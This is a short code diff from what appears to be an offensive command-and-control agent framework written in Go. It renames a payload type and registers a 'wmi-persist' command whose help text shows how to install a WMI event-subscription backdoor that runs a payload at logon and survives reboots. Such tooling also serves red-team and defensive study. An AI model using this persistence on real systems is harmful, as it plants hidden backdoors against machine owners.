@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "wmi-persist",
 		Description:         "Install, remove, or list WMI Event Subscription persistence. Creates persistent event filter + command-line consumer that survives reboots.",
 		HelpString:          "wmi-persist -action install -name backdoor -trigger logon -command \"C:\\payload.exe\"\nwmi-persist -action list\nwmi-persist -action remove -name backdoor",
